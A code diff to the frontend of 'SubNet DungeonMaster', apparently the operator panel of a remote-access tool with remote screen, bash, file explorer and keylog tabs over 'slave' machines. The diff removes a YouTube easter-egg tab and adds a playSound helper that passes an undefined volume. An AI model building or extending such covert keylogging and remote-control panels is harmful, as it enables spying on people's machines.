@@ -1,8 +1,9 @@
 /**
  * SubNet DungeonMaster — frontend
  *
- * Hotkeys: 1–5 tabs, 6 dungeon (if unlocked), S drawer, R reconnect, Esc, Ctrl+L bash
- * Bash: ↑↓ history · "enter the dungeon" unlocks ♂ tab
+ * Hotkeys: 1–5 tabs, S drawer, R reconnect, Esc, Ctrl+L bash
+ * Bash: ↑↓ history
+ * playSound(base64 [, mime]) / stopSound()
  */
 
 (function () {
@@ -48,7 +49,6 @@
   const PAGE_ORDER = ['info', 'screen', 'bash', 'explorer', 'keylog'];
   const BASH_HISTORY_KEY = 'dm_bash_history';
   const BASH_HISTORY_MAX = 80;
-  const DEFAULT_YT = 'dQw4w9WgXcQ';
 
   let currentPage = 'info';
   let activeSlaveId = null;
@@ -60,8 +60,6 @@
   let cmEditor = null;
   let keylogEntries = [];
   let keylogSelected = new Set();
-  let dungeonUnlocked = false;
-  let dungeonCurrentId = DEFAULT_YT;
 
   let bashHistory = [];
   try {
@@ -118,11 +116,6 @@
   const keylogTo = $('#keylog-to');
   const btnKeylogApply = $('#btn-keylog-apply');
   const btnKeylogSave = $('#btn-keylog-save');
-  const tabDungeon = $('#tab-dungeon');
-  const dungeonYt = $('#dungeon-yt');
-  const dungeonPlayer = $('#dungeon-player');
-  const dungeonThumb = $('#dungeon-thumb');
-  const dungeonTitle = $('#dungeon-title');
 
   function isTypingTarget(el) {
     if (!el) return false;
@@ -184,11 +177,7 @@
 
   function switchPage(name) {
     if (!name || name === currentPage) return;
-    if (name === 'dungeon') {
-      if (!dungeonUnlocked) return;
-    } else if (PAGE_ORDER.indexOf(name) < 0) {
-      return;
-    }
+    if (PAGE_ORDER.indexOf(name) < 0) return;
     currentPage = name;
     $$('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === name));
     $$('.page').forEach(p => p.classList.toggle('active', p.id === 'page-' + name));
@@ -219,68 +208,6 @@
     callPython('on_reconnect');
   }
 
-  // ─── dungeon (YT 153-safe) ─────────────────────────────────
-  function ytWatchUrl(id) { return 'https://www.youtube.com/watch?v=' + id; }
-  function ytThumbUrl(id) { return 'https://i.ytimg.com/vi/' + id + '/hqdefault.jpg'; }
-  function ytEmbedUrl(id) {
-    const origin = (location.origin && location.origin !== 'null') ? location.origin : 'https://localhost';
-    return 'https://www.youtube-nocookie.com/embed/' + id
-      + '?rel=0&modestbranding=1&playsinline=1'
-      + '&origin=' + encodeURIComponent(origin);
-  }
-
-  function openExternalVideo(id) {
-    const url = ytWatchUrl(id || dungeonCurrentId);
-    try {
-      if (window.pywebview && window.pywebview.api) {
-        if (typeof window.pywebview.api.open_url === 'function') {
-          window.pywebview.api.open_url(url); return;
-        }
-        if (typeof window.pywebview.api.on_open_url === 'function') {
-          window.pywebview.api.on_open_url(url); return;
-        }
-      }
-    } catch (_) {}
-    try { window.open(url, '_blank'); }
-    catch (_) { sendAnnounce('Open: ' + url, 'info'); }
-  }
-
-  function stopDungeonVideo() {
-    if (dungeonYt) { dungeonYt.src = ''; dungeonYt.hidden = true; }
-    if (dungeonPlayer) dungeonPlayer.classList.remove('embed-active');
-  }
-
-  function playDungeonVideo(id) {
-    dungeonCurrentId = id || DEFAULT_YT;
-    stopDungeonVideo();
-    if (dungeonThumb) dungeonThumb.src = ytThumbUrl(dungeonCurrentId);
-    if (dungeonTitle) dungeonTitle.textContent = 'Track · ' + dungeonCurrentId;
-  }
-
-  function tryDungeonEmbed() {
-    if (!dungeonYt) return;
-    dungeonYt.hidden = false;
-    dungeonYt.src = ytEmbedUrl(dungeonCurrentId || DEFAULT_YT);
-    if (dungeonPlayer) dungeonPlayer.classList.add('embed-active');
-    sendAnnounce('If embed shows error 153 — use EXTERNAL', 'warn');
-  }
-
-  function unlockDungeonTab(andOpen) {
-    dungeonUnlocked = true;
-    if (tabDungeon) tabDungeon.hidden = false;
-    sendAnnounce('The door is open, master', 'success');
-    if (andOpen) {
-      switchPage('dungeon');
-      playDungeonVideo(DEFAULT_YT);
-    }
-  }
-
-  function sealDungeonTab() {
-    stopDungeonVideo();
-    if (currentPage === 'dungeon') switchPage('info');
-    dungeonUnlocked = false;
-    if (tabDungeon) tabDungeon.hidden = true;
-  }
 
   function setAuthenticated(state) {
     if (state) {
@@ -293,7 +220,6 @@
       if (passwordInp) passwordInp.value = '';
       setLoginError(null);
       closeSlave(false);
-      sealDungeonTab();
     }
   }
 
@@ -723,8 +649,6 @@
     '300 bucks': 'Invoice sent to the dungeon',
     'gachi': null,
     'lotion': 'Application requires elevated privileges',
-    'enter the dungeon': '__UNLOCK_DUNGEON__',
-    'leave the dungeon': '__SEAL_DUNGEON__',
   };
   on(bashInput, 'keydown', (e) => {
     if (e.key !== 'Enter') return;
@@ -738,17 +662,6 @@
     pushBashHistory(raw);
     bashHistoryIdx = -1;
     bashInput.value = '';
-    if (code === '__UNLOCK_DUNGEON__') {
-      appendBash('Access granted · ♂', 'sys');
-      unlockDungeonTab(true);
-      return;
-    }
-    if (code === '__SEAL_DUNGEON__') {
-      appendBash('Door sealed', 'sys');
-      sealDungeonTab();
-      sendAnnounce('Dungeon sealed', 'info');
-      return;
-    }
     const msg = code === null
       ? GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]
       : code;
@@ -997,17 +910,6 @@
     callPython('onKeyLogSave', keys);
   });
 
-  // dungeon UI
-  on($('#btn-dungeon-hide'), 'click', () => {
-    sealDungeonTab();
-    sendAnnounce('Dungeon sealed', 'info');
-  });
-  on($('#btn-dungeon-stop'), 'click', stopDungeonVideo);
-  on($('#btn-dungeon-try-embed'), 'click', tryDungeonEmbed);
-  on($('#btn-dungeon-external'), 'click', () => openExternalVideo());
-  $$('.dungeon-toolbar [data-yt]').forEach((btn) => {
-    on(btn, 'click', () => playDungeonVideo(btn.dataset.yt));
-  });
 
   // hotkeys
   document.addEventListener('keydown', (e) => {
@@ -1033,7 +935,6 @@
       if (page) { switchPage(page); e.preventDefault(); }
       return;
     }
-    if (k === '6' && dungeonUnlocked) { switchPage('dungeon'); e.preventDefault(); return; }
     if (k === 's' || k === 'S') { toggleDrawer(); e.preventDefault(); return; }
     if (k === 'r' || k === 'R') { doReconnect(); e.preventDefault(); return; }
   });
@@ -1069,6 +970,42 @@
     });
   }
 
+
+  /**
+   * playSound(base64 [, mime])
+   * Plays audio from raw base64 or full data URI.
+   * @param {string} base64
+   * @param {string} [mime='audio/mpeg']
+   */
+  let _soundAudio = null;
+  function playSound(base64, mime, volume) {
+    if (!base64 || typeof base64 !== 'string') return;
+    let src = base64;
+    if (!src.startsWith('data:') && !src.startsWith('blob:') && !src.startsWith('http')) {
+      src = 'data:' + (mime || 'audio/mpeg') + ';base64,' + src.replace(/\s+/g, '');
+    }
+    try {
+      if (_soundAudio) {
+        try { _soundAudio.pause(); } catch (_) {}
+        _soundAudio = null;
+      }
+      _soundAudio = new Audio(src);
+      _soundAudio.volume = volume;
+      _soundAudio.play().catch((err) => {
+        console.warn('[playSound]', err);
+        sendAnnounce('Sound play failed', 'warn');
+      });
+    } catch (e) {
+      console.warn('[playSound]', e);
+    }
+  }
+  function stopSound() {
+    if (_soundAudio) {
+      try { _soundAudio.pause(); _soundAudio.currentTime = 0; } catch (_) {}
+      _soundAudio = null;
+    }
+  }
+
   window.setAuthenticated = setAuthenticated;
   window.setMaximized = setMaximized;
   window.sendAnnounce = sendAnnounce;
@@ -1083,12 +1020,13 @@
   window.setExplorerPath = setExplorerPath;
   window.setExplorerFile = setExplorerFile;
   window.setKeyLog = setKeyLog;
+  window.playSound = playSound;
+  window.stopSound = stopSound;
 
   window.DM = {
     setAuthenticated, setMaximized, sendAnnounce, setSlavesTree, setInfo, setScreen,
     appendBash, clearBash, setLoginError, openSlave, closeSlave, switchPage,
-    setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog,
-    unlockDungeonTab, sealDungeonTab
+    setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog, playSound, stopSound
   };
 
   updateNoSlaveHint();
